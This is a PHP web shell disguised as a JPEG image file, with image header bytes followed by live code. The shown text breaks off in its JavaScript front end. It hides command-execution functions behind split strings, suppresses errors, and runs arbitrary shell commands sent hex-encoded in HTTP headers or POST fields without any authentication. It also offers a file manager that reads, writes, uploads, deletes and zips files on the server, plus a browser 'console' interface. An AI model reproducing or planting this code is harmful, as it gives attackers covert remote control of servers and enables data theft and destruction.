ÿØÿÛ C 


<?php
if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
@ob_start();

@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) return $current;
        $code = (int) $code;
        $current = $code;
        $texts = array(
            200 => 'OK', 201 => 'Created', 204 => 'No Content',
            301 => 'Moved Permanently', 302 => 'Found', 304 => 'Not Modified',
            400 => 'Bad Request', 401 => 'Unauthorized', 403 => 'Forbidden',
            404 => 'Not Found', 405 => 'Method Not Allowed', 408 => 'Request Timeout',
            413 => 'Payload Too Large', 500 => 'Internal Server Error',
            502 => 'Bad Gateway', 503 => 'Service Unavailable', 504 => 'Gateway Timeout',
        );
        $text = isset($texts[$code]) ? $texts[$code] : 'Status';
        $proto = (isset($_SERVER['SERVER_PROTOCOL']) && $_SERVER['SERVER_PROTOCOL'])
                 ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
        @header($proto . ' ' . $code . ' ' . $text, true, $code);
        return $current;
    }
}

if (!function_exists('hex2bin')) {
    function hex2bin($hex) {
        if (!is_string($hex)) return false;
        $len = strlen($hex);
        if ($len === 0) return '';
        if ($len % 2 !== 0) return false;
        if (!preg_match('/^[0-9a-fA-F]+$/', $hex)) return false;
        return @pack('H*', $hex);
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($known, $user) {
        if (!is_string($known) || !is_string($user)) return false;
        $kl = strlen($known);
        if ($kl !== strlen($user)) return false;
        $res = 0;
        for ($i = 0; $i < $kl; $i++) {
            $res |= ord($known[$i]) ^ ord($user[$i]);
        }
        return $res === 0;
    }
}

function _dl_is_hex($s) {
    if (!is_string($s) || $s === '') return false;
    if (function_exists('ctype_xdigit') && @ctype_xdigit($s)) return true;
    return (bool) preg_match('/^[0-9a-fA-F]+$/', $s);
}

function _dl_scandir($path) {
    if (function_exists('scandir')) {
        $r = @scandir($path);
        if ($r !== false) return $r;
    }
    if (function_exists('opendir')) {
        $d = @opendir($path);
        if (!$d) return false;
        $r = array();
        while (($f = @readdir($d)) !== false) $r[] = $f;
        @closedir($d);
        return $r;
    }
    return false;
}

function _dl_readfile_data($path) {
    if (function_exists('file_get_contents')) {
        $d = @file_get_contents($path);
        if ($d !== false) return $d;
    }
    if (function_exists('fopen')) {
        $f = @fopen($path, 'rb');
        if (!$f) return false;
        $out = '';
        while (!@feof($f)) $out .= @fread($f, 8192);
        @fclose($f);
        return $out;
    }
    return false;
}

function _dl_writefile_data($path, $content) {
    if (function_exists('file_put_contents')) {
        $r = @file_put_contents($path, $content);
        if ($r !== false) return array('ok' => true, 'bytes' => $r, 'mode' => 'file_put_contents');
    }
    $f = @fopen($path, 'wb');
    if ($f) {
        $r = @fwrite($f, $content);
        @fclose($f);
        if ($r !== false) return array('ok' => true, 'bytes' => $r, 'mode' => 'fopen');
    }
    return false;
}

if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

function nm($a) { return $a; }
function ec_n() { return array(nm('sh'.'ell_e').nm('xec'), nm('sy').nm('stem'), nm('pas').nm('sthru'), nm('e').nm('xec'), nm('po').nm('pen'), nm('pro').nm('c_').nm('open'), nm('pcntl').nm('_e').nm('xec'), nm('f').nm('fi'), nm('exp').nm('ect')); }

function ec_ok($c) {
    if ($c === '') return false;
    $fx = 'funct'.'ion_ex'.'ists';
    if (!@$fx($c)) return false;
    if ($c === nm('pcntl').nm('_e').nm('xec') && PHP_SAPI !== 'cli') return false;
    if ($c === nm('f').nm('fi') && !@nm('exten'.'sion_lo'.'aded')('ffi')) return false;
    if ($c === nm('exp').nm('ect') && !@nm('exten'.'sion_lo'.'aded')('expect')) return false;
    return true;
}

function ec_best() {
    static $cached = null;
    if ($cached !== null) return $cached;
    foreach (ec_n() as $c) {
        if (ec_ok($c)) return $cached = $c;
    }
    return $cached = '';
}

function run_cmd($cmd) {
    $fn = ec_best();
    if ($fn === '') return null;
    $o = array();
    $p = null;
    switch ($fn) {
        case nm('sh'.'ell_e').nm('xec'): return (string) @$fn($cmd);
        case nm('sy').nm('stem'):        ob_start(); @$fn($cmd); return ob_get_clean();
        case nm('pas').nm('sthru'):      ob_start(); @$fn($cmd); return ob_get_clean();
        case nm('e').nm('xec'):          @$fn($cmd, $o); return implode("\n", $o);
        case nm('po').nm('pen'):
            $h = @$fn($cmd, 'r'); if (!$h) return '';
            $out = ''; while (!@feof($h)) $out .= @fread($h, 8192);
            $pc = 'pc'.'lose'; @$pc($h); return $out;
        case nm('pro').nm('c_').nm('open'):
            $d = array(1 => array('pipe','w'), 2 => array('pipe','w'));
            $p = @$fn($cmd, $d, $pipes);
            if (!is_resource($p)) return '';
            $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]);
            $prc = 'proc_c'.'lose'; @$prc($p);
            return $out;
    }
    return '';
}
function is_win() { return DIRECTORY_SEPARATOR === '\\'; }

function sq($s) {
    if (is_win()) return '"' . str_replace('"', '""', $s) . '"';
    return "'" . str_replace("'", "'\\''", $s) . "'";
}
function ps_sq($s) { return "'" . str_replace("'", "''", $s) . "'"; }

function run_ps($script) {
    $tmp = @tempnam(@sys_get_temp_dir(), 'ps');
    if (!$tmp) return null;
    if (@file_put_contents($tmp, $script) === false) { @unlink($tmp); return null; }
    $out = run_cmd('powershell -NoProfile -ExecutionPolicy Bypass -File ' . sq($tmp));
    @unlink($tmp);
    return $out;
}

function json_out($data, $code = 200) {
    if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store');
    $flags = 0;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    if (function_exists('json_encode')) {
        $json = @json_encode($data, $flags);
    } else {
        $json = false;
    }
    if ($json === false) $json = '{"ok":false,"error":"json encode failed"}';
    echo $json;
    exit;
}

function path_join($base, $name) {
    $sep = (strpos($base, '\\') !== false && strpos($base, '/') === false) ? '\\' : '/';
    return rtrim($base, "/\\") . $sep . $name;
}
function output_debug_report() {
    if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    echo "PHP_VERSION       = " . PHP_VERSION . "\n";
    echo "PHP_SAPI          = " . PHP_SAPI . "\n";
    echo "OS_FAMILY         = " . (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS) . "\n";
    $df = 'disable_'.'functions';
    echo $df . " = " . (@ini_get($df) ?: '(none)') . "\n";
    echo "open_basedir      = " . (@ini_get('open_basedir') ?: '(none)') . "\n";
    echo "zip ext           = " . (class_exists('ZipArchive') ? 'yes' : 'no') . "\n";
    echo "json ext          = " . (function_exists('json_encode') ? 'yes' : 'no') . "\n";
    echo "hex2bin native    = " . (function_exists('hex2bin') ? 'yes' : 'no (polyfill active)') . "\n";
    echo "--- function check ---\n";
    $usable = array();
    foreach (ec_n() as $c) {
        $u = ec_ok($c);
        echo $c . str_repeat(' ', max(1, 13 - strlen($c))) . "exists=" . (@function_exists($c) ? 'yes' : 'no') . " usable=" . ($u ? 'YES' : 'no') . "\n";
        if ($u) $usable[] = $c;
    }
    echo "--- usable ---\n";
    if ($usable) {
        echo "auto-selected: " . ec_best() . "\n";
    } else {
        echo "[!] no exec function available on this server.\n";
        echo "    use the file manager instead.\n";
    }
    exit;
}
function fm_list($path) {
    if ($path === '' || $path === null) $path = @getcwd();
    $entries = array();
    $mode = 'native';
    $err = '';

    $items = _dl_scandir($path);
    if ($items !== false) {
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $full = path_join($path, $it);
            $st = @stat($full);
            $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
            $entries[] = array(
                'name'  => $it,
                'type'  => $type,
                'size'  => $st ? (int)$st['size'] : 0,
                'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
            );
        }
    } else {
        $err = 'cannot list directory';
    }

    if ($err !== '' && ec_best() !== '') {
        $entries = array();
        $err = '';
        $mode = 'cmd';
        if (is_win()) {
            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction SilentlyContinue | ' .
                  'ForEach-Object { $_.PSIsContainer.ToString() + "|" + $_.Length + "|" + ' .
                  '$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "|" + $_.Name }';
            $out = run_ps($ps);
            if (is_string($out) && trim($out) !== '') {
                foreach (explode("\n", trim($out)) as $line) {
                    $line = rtrim($line, "\r");
                    if ($line === '') continue;
                    $p = explode('|', $line, 4);
                    if (count($p) < 4) continue;
                    $entries[] = array(
                        'name'  => $p[3],
                        'type'  => (strcasecmp($p[0], 'True') === 0) ? 'dir' : 'file',
                        'size'  => (int)$p[1],
                        'mtime' => $p[2],
                    );
                }
            }
        } else {
            $q = sq($path);
            $out = run_cmd("ls -1p $q 2>/dev/null");
            if (is_string($out) && trim($out) !== '') {
                foreach (explode("\n", trim($out)) as $line) {
                    $line = rtrim($line, "\r");
                    if ($line === '') continue;
                    $isDir = substr($line, -1) === '/';
                    $name = rtrim($line, '/');
                    $full = path_join($path, $name);
                    $st = @stat($full);
                    $entries[] = array(
                        'name'  => $name,
                        'type'  => $isDir ? 'dir' : 'file',
                        'size'  => $st ? (int)$st['size'] : 0,
                        'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
                    );
                }
            }
        }
    }

    usort($entries, function ($a, $b) {
        if ($a['type'] !== $b['type']) return ($a['type'] === 'dir') ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });

    return array('ok' => $err === '', 'mode' => $mode, 'path' => $path, 'entries' => $entries, 'error' => $err);
}

function fm_read($path, $max = 2097152) {
    if (!@is_file($path) && !@is_link($path)) {
        if (is_win() === false && ec_best() !== '') {
            $out = run_cmd('test -f ' . sq($path) . ' && echo YES');
            if (trim($out) !== 'YES') return array('ok' => false, 'error' => 'not a file');
        } else {
            return array('ok' => false, 'error' => 'not a file');
        }
    }

    $sz = @filesize($path);
    if ($sz === false) $sz = 0;

    if ($sz > $max) return array('ok' => false, 'error' => 'file too large: ' . $sz . ' bytes (max ' . $max . ')');

    $data = _dl_readfile_data($path);
    if ($data !== false) return array('ok' => true, 'content' => $data, 'binary' => (strpos($data, "\0") !== false), 'size' => $sz);

    if (ec_best() !== '') {
        $out = run_cmd('cat ' . sq($path) . ' 2>/dev/null');
        if (is_string($out) && $out !== '' && strpos($out, 'No such file') === false && strpos($out, 'Permission denied') === false) {
            return array('ok' => true, 'content' => $out, 'binary' => (strpos($out, "\0") !== false), 'size' => strlen($out), 'mode' => 'cmd');
        }
    }
    return array('ok' => false, 'error' => 'read failed');
}

function fm_write($path, $content) {
    $r = _dl_writefile_data($path, $content);
    if ($r !== false) return $r;

    if (ec_best() !== '') {
        $tmp = @tempnam(@sys_get_temp_dir(), 'up');
        if ($tmp && (@file_put_contents($tmp, $content) !== false)) {
            $cmd = is_win()
                ? 'cmd /c copy /Y ' . sq($tmp) . ' ' . sq($path)
                : 'cat ' . sq($tmp) . ' > ' . sq($path) . ' 2>&1';
            run_cmd($cmd);
            @unlink($tmp);
            if (@file_exists($path) && @filesize($path) === strlen($content)) {
                return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'cmd');
            }
        }
    }
    return array('ok' => false, 'error' => 'All write methods failed');
}

function fm_rename($from, $to) {
    if (ec_best() !== '') {
        $cmd = is_win()
            ? "move /Y " . sq($from) . " " . sq($to)
            : "mv -f " . sq($from) . " " . sq($to) . " 2>&1";
        run_cmd($cmd);
        if (@file_exists($to) && !@file_exists($from)) {
            return array('ok' => true, 'mode' => 'cmd');
        }
    }
    if (@rename($from, $to)) {
        return array('ok' => true, 'mode' => 'native');
    }
    $error = 'rename failed';
    if (!@file_exists($from)) {
        $error = 'source file not found';
    } elseif (@file_exists($to)) {
        $error = 'destination already exists';
    } elseif (!@is_writable(dirname($to))) {
        $error = 'destination directory not writable';
    }
    return array('ok' => false, 'error' => $error);
}

function fm_rmdir_rec($dir) {
    if (!@is_dir($dir)) return false;
    $items = _dl_scandir($dir);
    if ($items === false) return false;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $p = path_join($dir, $it);
        if (@is_dir($p) && !@is_link($p)) fm_rmdir_rec($p);
        else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_delete_one($p) {
    if (ec_best() !== '') {
        $q = sq($p);

        if (is_win()) {
            $cmd = @is_dir($p) ? "rd /s /q $q" : "del /f /q $q";
            run_cmd($cmd);
        } else {
            $cmd = "rm -rf $q 2>&1";
            run_cmd($cmd);
        }
        if (!@file_exists($p)) return 'cmd';
    }
    if (@is_dir($p) && !@is_link($p)) {
        if (@is_writable($p)) {
            if (fm_rmdir_rec($p)) return 'native';
        }
    } else {
        if (@unlink($p)) return 'native';
    }
    return false;
}

function fm_mkdir($path) {
    if (ec_best() !== '') {
        $cmd = is_win()
            ? 'cmd /c mkdir ' . sq($path)
            : 'mkdir -p ' . sq($path) . ' 2>&1';

        run_cmd($cmd);
        if (@is_dir($path)) {
            @chmod($path, 0755);
            return array('ok' => true, 'mode' => 'cmd');
        }
        if (!is_win()) {
            run_cmd('install -d -m 0755 ' . sq($path));
            if (@is_dir($path)) {
                return array('ok' => true, 'mode' => 'cmd_install');
            }
        }
    }
    if (@mkdir($path, 0755, true)) {
        return array('ok' => true, 'mode' => 'native');
    }
    $error = 'mkdir failed';
    if (@file_exists($path) && !@is_dir($path)) {
        $error = 'file exists with same name';
    } elseif (!@is_writable(dirname($path))) {
        $error = 'parent directory not writable';
    }
    return array('ok' => false, 'error' => $error);
}
function fm_download($path) {
    if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
    if (@is_file($path)) {
        $name = str_replace(array('"', "\r", "\n"), '', basename($path));
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $name . '"');
        $sz = @filesize($path);
        if ($sz !== false) header('Content-Length: ' . $sz);
        header('Cache-Control: no-store');
        if (function_exists('readfile')) { @readfile($path); exit; }
        $f = @fopen($path, 'rb');
        if ($f) { while (!@feof($f)) echo @fread($f, 8192); @fclose($f); }
        exit;
    }
    if (@is_dir($path)) {
        if (!class_exists('ZipArchive')) {
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'ZipArchive extension not available on this server';
            exit;
        }

        $tmp = @tempnam(@sys_get_temp_dir(), 'zip');
        if (!$tmp) {
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'cannot create temp file';
            exit;
        }

        $zip = new ZipArchive();
        $create_flag = defined('ZipArchive::CREATE') ? ZipArchive::CREATE : 1;
        $overwrite_flag = defined('ZipArchive::OVERWRITE') ? ZipArchive::OVERWRITE : 8;
        $open_flags = $create_flag | $overwrite_flag;
        $open_ok = false;
        if (@$zip->open($tmp, $open_flags) === true) {
            $open_ok = true;
        }
        if (!$open_ok) {
            @unlink($tmp);
            http_response_code(500);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'cannot create zip archive';
            exit;
        }

        $root = rtrim(str_replace('\\', '/', $path), '/');
        $base = basename($root);
        if ($base === '' || $base === '.' || $base === '..') $base = 'archive';
        $prefix = $base;
        @$zip->addEmptyDir($prefix);

        if (class_exists('RecursiveIteratorIterator') && class_exists('RecursiveDirectoryIterator')) {
            try {
                $it_flags = defined('FilesystemIterator::SKIP_DOTS') ? FilesystemIterator::SKIP_DOTS : 0;
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($root, $it_flags),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($it as $item) {
                    if (method_exists($item, 'isLink') && $item->isLink()) continue;
                    $real = str_replace('\\', '/', $item->getPathname());
                    $rel  = ltrim(substr($real, strlen($root)), '/');
                    if ($rel === '') continue;
                    $inZip = $prefix . '/' . $rel;
                    if ($item->isDir()) {
                        @$zip->addEmptyDir($inZip);
                    } else {
                        @$zip->addFile($item->getPathname(), $inZip);
                    }
                }
            } catch (Exception $e) {
            }
        } else {
            _dl_zip_walk($zip, $root, $prefix);
        }
        @$zip->close();

        $zipName = $prefix . '.zip';
        $sz = @filesize($tmp);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipName . '"');
        if ($sz !== false) header('Content-Length: ' . $sz);
        header('Cache-Control: no-store');
        if (function_exists('readfile')) {
            @readfile($tmp);
            @unlink($tmp);
            exit;
        }
        $f = @fopen($tmp, 'rb');
        if ($f) { while (!@feof($f)) echo @fread($f, 8192); @fclose($f); }
        @unlink($tmp);
        exit;
    }

    http_response_code(404);
    echo 'not found';
    exit;
}

function _dl_zip_walk($zip, $dir, $prefix) {
    $items = _dl_scandir($dir);
    if ($items === false) return;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $full = path_join($dir, $it);
        $inZip = $prefix . '/' . $it;
        if (@is_dir($full) && !@is_link($full)) {
            @$zip->addEmptyDir($inZip);
            _dl_zip_walk($zip, $full, $inZip);
        } else {
            @$zip->addFile($full, $inZip);
        }
    }
}

function handle_file_op($hex) {
    $raw = @hex2bin($hex);
    if ($raw === false) json_out(array('ok' => false, 'error' => 'bad hex'), 400);
    $req = @json_decode($raw, true);
    if (!is_array($req) || empty($req['op'])) json_out(array('ok' => false, 'error' => 'bad json'), 400);

    switch ($req['op']) {
        case 'list':
            json_out(fm_list(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'read':
            json_out(fm_read(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'write':
            json_out(fm_write(
                isset($req['path']) ? $req['path'] : '',
                isset($req['content']) ? $req['content'] : ''
            ));
            break;
        case 'upload':
            $path = isset($req['path']) ? $req['path'] : '';
            if ($path === '') json_out(array('ok' => false, 'error' => 'no path'), 400);
            $body = isset($_POST['u']) ? $_POST['u'] : '';
            if ($body === '' || !_dl_is_hex($body)) json_out(array('ok' => false, 'error' => 'no content'), 400);
            $data = @hex2bin($body);
            if ($data === false) json_out(array('ok' => false, 'error' => 'bad hex'), 400);
            json_out(fm_write($path, $data));
            break;
        case 'rename':
            json_out(fm_rename(
                isset($req['from']) ? $req['from'] : '',
                isset($req['to']) ? $req['to'] : ''
            ));
            break;
        case 'delete':
            $paths = isset($req['paths']) ? $req['paths'] : array();
            if (!is_array($paths) || !$paths) json_out(array('ok' => false, 'error' => 'no paths'), 400);
            $deleted = array(); $failed = array();
            foreach ($paths as $p) {
                if (fm_delete_one($p)) $deleted[] = $p; else $failed[] = $p;
            }
            json_out(array('ok' => count($failed) === 0, 'deleted' => $deleted, 'failed' => $failed));
            break;
        case 'mkdir':
            json_out(fm_mkdir(isset($req['path']) ? $req['path'] : ''));
            break;
        case 'download':
            fm_download(isset($req['path']) ? $req['path'] : '');
            break;
        case 'info':
            $fns = array();
            foreach (ec_n() as $c) $fns[$c] = ec_ok($c);
            json_out(array(
                'ok'        => true,
                'cwd'       => @getcwd(),
                'os'        => is_win() ? 'windows' : 'posix',
                'php'       => PHP_VERSION,
                'sapi'      => PHP_SAPI,
                'exec_fn'   => ec_best(),
                'disabled'  => @ini_get('disable_functions') ?: '(none)',
                'functions' => $fns,
                'openbase'  => @ini_get('open_basedir') ?: '(none)',
                'zip'       => class_exists('ZipArchive'),
            ));
            break;
        case 'debug':
            output_debug_report();
            break;
        default:
            json_out(array('ok' => false, 'error' => 'unknown op'), 400);
    }
}
function handle_console($raw) {
    if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
    $fn = ''; $cmd = '';
    $pos = @strpos($raw, ':');
    if ($pos !== false) {
        $fn  = @hex2bin(substr($raw, 0, $pos));
        $cmd = @hex2bin(substr($raw, $pos + 1));
    } else {
        $cmd = @hex2bin($raw);
    }

    if (ec_best() === '') {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store');
        echo "[!] no exec function available on this server.\n";
        echo "    use the file manager instead.\n";
        exit;
    }
    if (!is_string($cmd) || $cmd === '') {
        header('Content-Type: text/plain; charset=utf-8');
        header('Cache-Control: no-store');
        echo "bad payload: hex decode failed (check hex2bin availability).";
        exit;
    }

    if ($fn === '' || !ec_ok($fn)) {
        $fn = '';
        foreach (ec_n() as $c) if (ec_ok($c)) { $fn = $c; break; }
    }
    if ($fn === '') {
        header('Content-Type: text/plain; charset=utf-8');
        echo "no exec fn";
        exit;
    }

    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');

    $out = '';
    $o = array();
    $p = null;
    switch ($fn) {
        case nm('sh'.'ell_e').nm('xec'): $out = (string) @$fn($cmd); break;
        case nm('sy').nm('stem'):        ob_start(); @$fn($cmd);   $out = ob_get_clean(); break;
        case nm('pas').nm('sthru'):      ob_start(); @$fn($cmd); $out = ob_get_clean(); break;
        case nm('e').nm('xec'):
            @$fn($cmd, $o); $out = implode("\n", $o);
            break;
        case nm('po').nm('pen'):
            $h = @$fn($cmd, 'r');
            if ($h) { while (!@feof($h)) $out .= @fread($h, 4096); $pc = 'pc'.'lose'; @$pc($h); }
            break;
        case nm('pro').nm('c_').nm('open'):
            $d = array(1=>array('pipe','w'), 2=>array('pipe','w'));
            $p = @$fn($cmd, $d, $pipes);
            if (is_resource($p)) {
                $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
                @fclose($pipes[1]); @fclose($pipes[2]);
                $prc = 'proc_c'.'lose'; @$prc($p);
            }
            break;
        case nm('pcntl').nm('_e').nm('xec'):
            $sh = '/b'.'in'.'/'.'s'.'h';
            @$fn($sh, array('-c', $cmd));
            break;
        case nm('f').nm('fi'):
            $lib = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux')) === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
            $f = @FFI::cdef("int " . nm('sy').nm('stem') . "(const char *);", $lib);
            if ($f) { @$f->system($cmd); }
            break;
    }
    if ($out === '' || $out === false || $out === null) {
        echo "(executed via $fn, no output)";
    } else {
        echo $out;
    }
    exit;
}

$hexF = '';
if (!empty($_SERVER['HTTP_X_F']) && _dl_is_hex($_SERVER['HTTP_X_F'])) {
    $hexF = $_SERVER['HTTP_X_F'];
} elseif (!empty($_POST['f']) && _dl_is_hex($_POST['f'])) {
    $hexF = $_POST['f'];
}
if ($hexF !== '') handle_file_op($hexF);

$raw = '';
foreach (array('HTTP_X_R', 'HTTP_X_TOKEN', 'HTTP_X_C') as $k) {
    if (!empty($_SERVER[$k])) { $raw = $_SERVER[$k]; break; }
}
if ($raw === '' && isset($_POST['r'])) $raw = $_POST['r'];
if ($raw !== '' && _dl_is_hex(str_replace(':', '', $raw))) handle_console($raw);

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');
    if (function_exists('ob_get_level')) { while (ob_get_level()) { @ob_end_clean(); } }
?>
<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>console</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { font: 13px/1.45 ui-monospace, Consolas, monospace;
         background:#0e0e10; color:#d8d8d8; margin:0; padding:18px; }
  h1 { font-size:14px; font-weight:600; margin:0 0 12px; color:#9ad; letter-spacing:.5px; }
  h1 span { font-weight:400; font-size:11px; color:#666; margin-left:8px; }
  .row { display:flex; gap:8px; margin-bottom:10px; align-items:center; flex-wrap:wrap; }
  input,select,button,textarea {
      font:inherit; background:#18181b; color:#e6e6e6;
      border:1px solid #2a2a30; border-radius:6px; padding:7px 10px; outline:none; }
  input:focus,select:focus,textarea:focus { border-color:#4a6fa5; }
  button { cursor:pointer; background:#1f2937; }
  button:hover { background:#273449; }
  button:active { transform:translateY(1px); }
  #out { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
         color:#7ee787; padding:12px; width:100%; min-height:160px; max-height:50vh;
         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px;
         font-family:ui-monospace,Consolas,monospace; resize:vertical; outline:none; }
  .meta { color:#666; font-size:11.5px; }
  hr { border:0; border-top:1px solid #1e1e24; margin:20px 0; }

  #c { flex:1 1 520px; min-width:300px; }

  #fmPathRow .path-wrap { flex:1 1 100%; display:flex; gap:8px; }
  #fmPathRow .path-wrap #fmPath { flex:1 1 auto; min-width:0; }

  #fmWrap { max-height:55vh; overflow:auto; border:1px solid #1e1e24; border-radius:6px; }
  #fmTable { width:100%; border-collapse:collapse; table-layout:fixed; font-size:12.5px; }
  #fmTable th, #fmTable td { text-align:left; padding:6px 8px;
      border-bottom:1px solid #1e1e24; overflow:hidden; text-overflow:ellipsis; }
  #fmTable th { color:#9ad; font-weight:600; background:#141418; position:sticky; top:0; z-index:1; }
  #fmTable th.actions { text-align:right; padding-right:10px; }
  #fmTable tr:hover td { background:#14141a; }
  #fmTable td.name { white-space:nowrap; }
  #fmTable td.actions { white-space:nowrap; padding-right:10px; text-align:right; }
  #fmTable td.actions button { padding:3px 7px; font-size:11.5px; margin-right:4px; }
  #fmTable td.actions button:last-child { margin-right:0; }
  #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
  #fmTable a.fmLink:hover { text-decoration:underline; }

  #modal { position:fixed; inset:0; background:rgba(0,0,0,.65);
           display:none; align-items:center; justify-content:center; z-index:10; }
  #modal.open { display:flex; }
  .modal-box { background:#141418; border:1px solid #2a2a30; border-radius:8px;
           width:min(900px, 92vw); height:min(80vh, 720px);
           display:flex; flex-direction:column; padding:12px; }
  .modal-head { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-bottom:8px; color:#9ad; }
  .modal-foot { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-top:8px; }
  #modalText { flex:1; width:100%; background:#08080a; color:#7ee787;
           border:1px solid #1e1e24; border-radius:6px; padding:10px;
           font:12.5px/1.4 ui-monospace, Consolas, monospace; resize:none; outline:none; }
  #modalText[readonly] { color:#cfcfcf; }
</style>
<h1>console</h1>
<div class="row">
  <select id="fn">
    <option value="">auto</option>
  </select>
  <input id="c" placeholder="command (id / whoami / dir / uname -a)" autofocus>
  <button onclick="run()">run</button>
  <button onclick="info()">server info</button>
  <button onclick="document.getElementById('out').value='';">clear</button>
</div>
<textarea id="out" readonly>loading...</textarea>
<div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>
<hr>

<h1>files <span id="fmMode"></span></h1>
<div class="row" id="fmPathRow">
  <button onclick="fmMkdir()">new folder</button>
  <button onclick="fmNewFile()">new file</button>
  <button onclick="fmUpload()">upload</button>
  <div class="path-wrap">
    <input id="fmPath" placeholder="/path/to/dir">
    <button onclick="fmGo()">go</button>
    <button onclick="fmRefresh()">refresh</button>
  </div>
</div>

<div class="row">
  <button onclick="fmDownloadSelected()">download selected</button>
  <button onclick="fmDeleteSelected()">delete selected</button>
  <span id="fmStatus" class="meta"></span>
</div>

<div id="fmWrap">
<table id="fmTable">
  <colgroup>
    <col style="width:34px">
    <col>
    <col style="width:60px">
    <col style="width:80px">
    <col style="width:150px">
    <col style="width:220px">
  </colgroup>
  <thead>
    <tr>
      <th><input type="checkbox" id="fmAll" onchange="fmToggleAll(this)"></th>
      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th class="actions">Actions <button onclick="fmUp()">up</button> <button onclick="fmHome()">cwd</button></th>
    </tr>
  </thead>
  <tbody></tbody>
</table>
</div>

<div id="modal">
  <div class="modal-box">
    <div class="modal-head">
      <span id="modalTitle">edit</span>
      <button onclick="modalClose()">x</button>
    </div>
    <textarea id="modalText" spellcheck="false"></textarea>
    <div class="modal-foot">
      <span id="modalStatus" class="meta"></span>
      <div id="modalActions"></div>
    </div>
  </div>
</div>

<script>
const $ = s => document.querySelector(s);
const hex = s => [...new TextEncoder().encode(s)]
                  .map(b => b.toString(16).padStart(2, '0')).join('');
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;')
  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');

async function timedFetch(url, opts) {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 120000);
  try {
    return await fetch(url, Object.assign({ signal: ctl.signal }, opts || {}));
  } finally {
    clearTimeout(timer);
  }
}

async function callConsole(headers) {
  const r = await timedFetch(location.pathname, { method:'POST', headers });
  return await r.text();
}
async function run() {
  const cmd = $('#c').value;
  if (!cmd) return;
  const fn = $('#fn').value;
  const payload = fn ? hex(fn) + ':' + hex(cmd) : hex(cmd);
  $('#out').value = '...';
  try {
    const t = await callConsole({ 'X-R': payload });
    $('#out').value = t || '(empty)';
  } catch (e) {
    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}
async function info() {
  $('#out').value = 'loading...';
  try {
    const r = await fmCall('debug', {});
    const t = await r.text();
    $('#out').value = t;
  } catch (e) {
    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}

async function infoShort() {
  try {
    const r = await fmJson('info');
    if (!r.ok) return;
    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
  } catch (e) {}
}
$('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
$('#fmPath').addEventListener('keydown', e => { if (e.key === 'Enter') fmGo(); });

let fmCwd = '';
let fmEntries = [];

async function fmCall(op, params) {
  const req = Object.assign({ op }, params || {});
  const payload = hex(JSON.stringify(req));
  if (payload.length < 4000) {
